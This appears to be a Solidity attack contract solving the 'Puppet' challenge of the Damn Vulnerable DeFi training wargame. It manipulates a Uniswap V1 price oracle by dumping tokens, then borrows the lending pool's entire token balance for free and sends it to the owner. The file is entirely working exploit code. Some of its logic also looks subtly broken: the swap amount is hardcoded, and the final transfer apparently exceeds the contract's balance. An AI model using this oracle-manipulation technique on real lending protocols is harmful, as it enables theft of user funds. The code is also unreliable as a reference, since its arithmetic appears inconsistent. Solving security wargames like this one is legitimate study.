pragma solidity ^0.8.5;

import "./PuppetPool.sol";
import "../DamnValuableToken.sol";

interface IUniswapV1Pair{
    function tokenToEthSwapInput(uint256 tokens_sold,uint256 min_eth,uint256 deadline) external returns(uint256 out);
}

contract PuppetAttack {
    PuppetPool immutable puppetPool;
    IUniswapV1Pair immutable uniswap;
    address immutable owner;
    DamnValuableToken immutable dvt;
    constructor(
        PuppetPool pool,
        IUniswapV1Pair uniswapAddress,
        DamnValuableToken token
    )
    {
        puppetPool = pool;
        uniswap = uniswapAddress;
        dvt = token;
        owner = msg.sender;
    }
    

    function attack(uint256 oracleAmount) public { 
        dvt.approve(address(uniswap),oracleAmount);
        uniswap.tokenToEthSwapInput(10 ether, 5 ether, block.timestamp + 1);

        uint256 amount = dvt.balanceOf(address(puppetPool));
        require(puppetPool.calculateDepositRequired(amount) == 0,"Oracle is not compromised.");

        puppetPool.borrow(dvt.balanceOf(address(puppetPool)));
        dvt.transfer(owner,dvt.balanceOf(address(this))+oracleAmount);
    }
}